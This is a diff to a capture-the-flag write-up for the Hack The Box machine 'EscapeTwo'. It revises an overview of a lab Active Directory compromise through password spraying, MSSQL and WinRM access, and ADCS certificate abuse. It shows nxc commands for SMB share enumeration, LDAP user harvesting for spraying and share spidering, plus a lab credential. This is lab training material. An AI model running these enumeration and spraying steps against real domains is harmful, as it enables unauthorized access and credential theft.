@@ -15,7 +15,7 @@ tools_used: [nmap]
 
 ## Overview
 
-Complete domain compromise through credential discovery, password reuse, and certificate template abuse via WriteOwner permissions.
+`EscapeTwo` is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to `MSSQL`, granting us initial access. System enumeration reveals `SQL` credentials, which are sprayed to obtain `WinRM` access. Further domain analysis shows the user has write owner rights over an account managing `ADCS`. This is used to enumerate `ADCS`, revealing a misconfiguration in Active Directory Certificate Services. Exploiting this misconfiguration allows us to retrieve the `Administrator` account hash, ultimately leading to complete domain compromise. 
 
 ```mermaid
 flowchart TD
@@ -76,7 +76,7 @@ nxc smb '10.10.11.51' --generate-hosts-file files/hosts && sudo tee -a /etc/host
 
 ### Initial Access Credentials
 
-Save the assumed breach credentials to files
+I saved the assumed breach credentials to files
 ```bash
 echo 'rose' > users.txt
 echo 'KxEPkKe6R8su' > creds.txt
@@ -84,8 +84,7 @@ echo 'KxEPkKe6R8su' > creds.txt
 
 ### Share Enumeration
 
-Authenticated SMB enumeration revealed accessible file shares:
-
+Started my enumeration by using the credentials to look for accessible SMB file shares.
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --shares 
 
@@ -103,7 +102,6 @@ SMB         10.10.11.51     445    DC01             Users           READ
 ### User Discovery
 
 LDAP enumeration built comprehensive user list for password spraying:
-
 ```bash
 nxc ldap 'DC01' -u 'rose' -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt
 
@@ -121,7 +119,6 @@ ca_svc
 ### File System Analysis
 
 SMB share spidering revealed organizational documents containing credentials:
-
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
